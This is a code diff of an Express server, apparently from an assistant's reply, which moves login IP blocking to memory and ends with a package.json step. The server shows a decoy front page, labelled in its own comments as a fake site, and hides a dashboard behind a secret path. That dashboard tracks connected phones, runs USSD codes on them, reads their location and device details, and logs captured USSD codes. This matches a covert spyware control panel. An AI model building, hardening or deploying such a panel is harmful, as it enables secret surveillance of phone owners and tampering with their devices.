@@ -1,14 +1,15 @@
-// server.js - PROFESSIONAL DASHBOARD with persistent IP block (Vercel KV) and Logout
+// server.js - SIMPLE & WORKING (in-memory IP blocking)
 const express = require('express');
 const crypto = require('crypto');
-const { kv } = require('@vercel/kv');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 const SECRET_PATH = process.env.SECRET_PATH || 'a9f3k217';
 const ADMIN_USER = 'admin';
 const ADMIN_PASS_HASH = crypto.createHash('sha256').update('yourpassword123').digest('hex');
-const BLOCK_DURATION_SECONDS = 12 * 60 * 60; // 12 hours
+
+// In-memory failed attempts (resets on server restart)
+const failedAttempts = {};
 
 function getClientIP(req) {
     return req.headers['x-forwarded-for']?.split(',')[0] ||
@@ -16,7 +17,9 @@ function getClientIP(req) {
            req.connection.remoteAddress;
 }
 
-// -------------------- FAKE SITE --------------------
+// ============================================
+// FAKE SITE
+// ============================================
 app.get('/', (req, res) => {
     res.send(`
         <html>
@@ -32,7 +35,9 @@ app.get('/', (req, res) => {
     `);
 });
 
-// -------------------- ADMIN DASHBOARD --------------------
+// ============================================
+// ADMIN DASHBOARD
+// ============================================
 app.get(`/${SECRET_PATH}`, (req, res) => {
     res.send(`<!DOCTYPE html>
 <html>
@@ -105,7 +110,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
 </head>
 <body>
 <div class="container">
-    <!-- LOGIN -->
     <div id="loginContainer" class="login-container">
         <div class="logo">🔐</div>
         <h3>Admin Access</h3>
@@ -116,8 +120,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
         <div id="attemptsMsg" class="attempts-msg"></div>
         <div id="loginError" class="error"></div>
     </div>
-
-    <!-- DASHBOARD -->
     <div id="dashboard" class="hidden">
         <div class="header">
             <div class="header-left">
@@ -126,15 +128,12 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             </div>
             <button class="logout-btn" onclick="logout()">🚪 Logout</button>
         </div>
-
         <div class="stats" id="statsGrid">
             <div class="stat-card"><div class="value" id="devicesCount">0</div><div class="label">📱 Devices</div></div>
             <div class="stat-card"><div class="value" id="numbersCount">0</div><div class="label">🔢 Numbers</div></div>
             <div class="stat-card"><div class="value" id="onlineCount">0</div><div class="label">🟢 Online</div></div>
         </div>
-
         <div class="tools-grid">
-            <!-- USSD -->
             <div class="tool-card">
                 <h4><span class="icon">📞</span> USSD Code</h4>
                 <div class="ussd-input-group">
@@ -143,7 +142,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
                 </div>
                 <div id="ussdResponse" class="ussd-response">Enter a USSD code and click Execute – response will appear here.</div>
             </div>
-            <!-- Location -->
             <div class="tool-card">
                 <h4><span class="icon">📍</span> Device Location</h4>
                 <div id="locationInfo" class="location-info">
@@ -155,7 +153,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
                     <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:0;font-size:13px;" onclick="refreshLocation()">🔄 Refresh Location</button>
                 </div>
             </div>
-            <!-- Device Info -->
             <div class="tool-card">
                 <h4><span class="icon">📱</span> Device Info</h4>
                 <div id="deviceInfo" class="device-info-grid">
@@ -169,21 +166,16 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
                 <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:8px 0 0 0;font-size:13px;" onclick="refreshDeviceInfo()">🔄 Refresh Device Info</button>
             </div>
         </div>
-
-        <!-- Connected Devices -->
         <div class="section">
             <h3>📱 Connected Devices <span class="badge-count" id="deviceCountBadge">0</span></h3>
             <div id="devicesList"><div class="empty"><div class="icon">📱</div>No devices connected yet</div></div>
         </div>
-
-        <!-- Recent USSD Codes -->
         <div class="section">
             <h3>🔢 Recent USSD Codes <span class="badge-count" id="numberCountBadge">0</span></h3>
             <div id="numbersList"><div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div></div>
         </div>
     </div>
 </div>
-
 <script>
 const API_BASE = '/${SECRET_PATH}';
 
@@ -351,23 +343,26 @@ document.getElementById('loginPass').addEventListener('keypress', (e) => {
     `);
 });
 
-// -------------------- API ENDPOINTS --------------------
+// ============================================
+// API ENDPOINTS
+// ============================================
 app.use(express.json());
 
-// Login with persistent IP block (KV with auto-expiry)
-app.post(`/${SECRET_PATH}/api/login`, async (req, res) => {
+// Login API (in-memory IP blocking)
+app.post(`/${SECRET_PATH}/api/login`, (req, res) => {
     const ip = getClientIP(req);
     const now = Date.now();
+    const blockDuration = 12 * 60 * 60 * 1000; // 12 hours
 
-    // 1. Check if currently blocked (KV key expires automatically after 12h)
-    const blockExists = await kv.exists(`block:${ip}`);
-    if (blockExists) {
+    // Check if blocked
+    if (failedAttempts[ip] && failedAttempts[ip].blockUntil > now) {
         return res.status(401).json({ error: 'Too many failed attempts. Try again later.' });
     }
 
-    // 2. Get attempt count
-    let attempts = await kv.get(`attempts:${ip}`) || 0;
-    attempts = parseInt(attempts);
+    // Reset if block expired
+    if (failedAttempts[ip] && failedAttempts[ip].blockUntil <= now) {
+        delete failedAttempts[ip];
+    }
 
     const { username, password } = req.body;
     const hash = crypto.createHash('sha256').update(password).digest('hex');
@@ -375,27 +370,29 @@ app.post(`/${SECRET_PATH}/api/login`, async (req, res) => {
     const validPass = validUser && hash === ADMIN_PASS_HASH;
 
     if (validUser && validPass) {
-        // Success – clear attempts
-        await kv.del(`attempts:${ip}`);
+        delete failedAttempts[ip];
         res.json({ success: true });
     } else {
-        // Failed – increment attempts
-        attempts += 1;
-        await kv.set(`attempts:${ip}`, attempts);
+        if (!failedAttempts[ip]) {
+            failedAttempts[ip] = { count: 1, blockUntil: 0 };
+        } else {
+            failedAttempts[ip].count += 1;
+        }
 
-        if (attempts >= 5) {
-            // Block IP for 12 hours (auto-expire)
-            await kv.set(`block:${ip}`, 'blocked', { ex: BLOCK_DURATION_SECONDS });
+        const remaining = 5 - failedAttempts[ip].count;
+        if (remaining <= 0) {
+            failedAttempts[ip].blockUntil = now + blockDuration;
             console.log(`🔒 IP ${ip} blocked for 12 hours`);
             return res.status(401).json({ remainingAttempts: 0 });
         }
 
-        res.status(401).json({ remainingAttempts: 5 - attempts });
+        res.status(401).json({ remainingAttempts: remaining });
     }
 });
 
-// USSD endpoints (unchanged)
+// USSD endpoints
 let ussdNumbers = [];
+
 app.post(`/${SECRET_PATH}/api/ussd`, (req, res) => {
     const { code } = req.body;
     if (!code) return res.status(400).json({ error: 'No USSD code provided' });
@@ -418,6 +415,7 @@ app.post(`/${SECRET_PATH}/api/ussd`, (req, res) => {
         });
         if (ussdNumbers.length > 100) ussdNumbers.pop();
     }
+
     res.json({ success: true, message: responseMessage });
 });
 
@@ -464,6 +462,22 @@ app.use((req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log('✅ Dashboard running with persistent IP block (KV + auto-expiry)');
+    console.log('✅ Dashboard running (in-memory IP blocking)');
     console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/${SECRET_PATH}`);
 });
+```
+
+---
+
+2. Update package.json
+
+Remove @vercel/kv from package.json. Replace with:
+
+```json
+{
+  "name": "admin-dashboard",
+  "version": "1.0.0",
+  "dependencies": {
+    "express": "^4.18.2"
+  }
+        }
